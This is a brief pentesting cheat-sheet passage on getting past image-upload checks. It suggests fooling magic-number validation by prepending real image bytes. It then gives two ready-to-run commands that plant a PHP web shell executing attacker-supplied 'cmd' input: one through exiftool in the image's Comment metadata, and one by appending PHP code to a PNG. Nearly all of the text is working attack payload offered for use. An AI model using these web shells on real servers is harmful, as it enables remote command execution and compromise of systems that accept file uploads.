## Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata:
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
## or you could also introduce the payload directly in an image:
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
- https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html